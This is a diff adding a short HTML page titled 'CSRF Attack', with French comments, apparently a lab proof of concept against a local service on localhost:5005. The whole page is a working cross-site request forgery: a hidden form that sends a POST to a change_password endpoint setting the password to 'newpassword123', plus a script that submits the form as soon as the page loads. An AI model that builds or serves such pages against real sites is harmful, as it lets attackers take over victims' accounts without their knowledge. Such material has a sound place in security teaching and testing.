@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <!-- Formulaire qui soumet une requête POST -->
+    <form id="csrf_form" method="POST" action="http://localhost:5005/change_password">
+        <input type="hidden" name="password" value="newpassword123">
+    </form>
+    <script>
+        // Soumission automatique du formulaire après chargement de la page
+        document.getElementById('csrf_form').submit();
+    </script>
+</body>
+</html>
